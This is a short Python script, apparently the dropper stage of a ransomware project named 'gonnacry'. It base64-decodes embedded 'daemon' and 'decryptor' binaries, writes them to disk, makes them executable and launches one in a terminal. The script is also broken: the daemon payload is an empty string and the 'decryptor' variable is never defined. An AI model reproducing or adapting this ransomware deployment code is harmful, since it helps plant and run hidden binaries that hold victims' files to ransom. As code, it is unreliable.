import os
import base64
import subprocess
import time
ransomware_path = '/home/tarcisio/gonnacry'

def drop_daemon_and_decryptor():
    daemon = """"""
    with open(ransomware_path + "/decryptor", 'wb') as f:
        f.write(base64.b64decode(decryptor))

    with open(ransomware_path + "/daemon", 'wb') as f:
        f.write(base64.b64decode(daemon))

    os.chdir(ransomware_path)
    os.system('chmod +x daemon')
    os.system('chmod +x decryptor')
    
    # run deamon 
    xfce = 'xfce4-terminal --command=./decryptor'
    os.system(xfce)

drop_daemon_and_decryptor()